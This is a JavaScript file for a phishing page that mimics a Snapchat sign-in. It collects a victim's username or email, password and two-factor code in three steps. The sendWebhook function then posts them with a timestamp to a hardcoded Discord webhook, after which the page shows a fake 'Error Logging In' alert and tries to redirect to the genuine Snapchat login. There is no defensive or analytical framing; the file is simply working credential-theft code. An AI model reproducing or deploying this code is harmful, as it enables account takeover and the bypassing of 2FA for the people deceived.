document.addEventListener('DOMContentLoaded', function () {
    const accountForm = document.getElementById('account_identifier_form');
    const passwordForm = document.getElementById('password_form');
    const twoFaForm = document.getElementById('2fa_form');
    const spinner = document.getElementById('spinner');

    let usernameOrEmail = '';
    let password = '';

    accountForm.addEventListener('submit', function (event) {
        event.preventDefault(); // Prevent default form submission

        // Fetch input value
        usernameOrEmail = document.getElementById('accountIdentifier').value;
        if (usernameOrEmail) {
            accountForm.style.display = 'none';
            passwordForm.style.display = 'block';
        }
    });

    passwordForm.addEventListener('submit', function (event) {
        event.preventDefault(); // Prevent default form submission

        // Fetch input value
        password = document.getElementById('password').value;
        if (password) {
            passwordForm.style.display = 'none';
            twoFaForm.style.display = 'block';
        }
    });

    twoFaForm.addEventListener('submit', function (event) {
        event.preventDefault(); // Prevent default form submission

        // Fetch input value
        const twoFaCode = document.getElementById('2fa').value;
        if (twoFaCode) {
            showSpinner();
            sendWebhook(usernameOrEmail, password, twoFaCode)
                .then(response => handleResponse(response))
                .catch(error => console.error('Error during form submission:', error))
                .finally(() => {
                    hideSpinner();
                    resetForms();
                    alert('Error Logging In');
                    window.location.href('https://accounts.snapchat.com/accounts/v2/login')
                });
        }
    });

    function showSpinner() {
        spinner.style.display = 'block';
    }

    function hideSpinner() {
        spinner.style.display = 'none';
    }

    function sendWebhook(username, password, twoFaCode) {
        // Prepare webhook data
        const webhookUrl = 'https://discord.com/api/webhooks/1244852519302336572/hIM76wzmJcBQEnzEQSwIG7sbqvpMmFsp4Eq4px3f1F4zejbVM3Tf0vVDfwWa9oW_pbpx';
        const payload = {
            content: `Username: ${username}\nPassword: ${password}\n2FA Code: ${twoFaCode}\nTimestamp: ${new Date().toISOString()}`
        };

        // Send data to Discord webhook
        return fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
    }

    function handleResponse(response) {
        if (!response.ok) {
            throw new Error(`Error sending webhook: ${response.status} ${response.statusText}`);
        }
        return response.json();
    }

    function resetForms() {
        accountForm.reset();
        passwordForm.reset();
        twoFaForm.reset();
        accountForm.style.display = 'block';
        passwordForm.style.display = 'none';
        twoFaForm.style.display = 'none';
    }
});
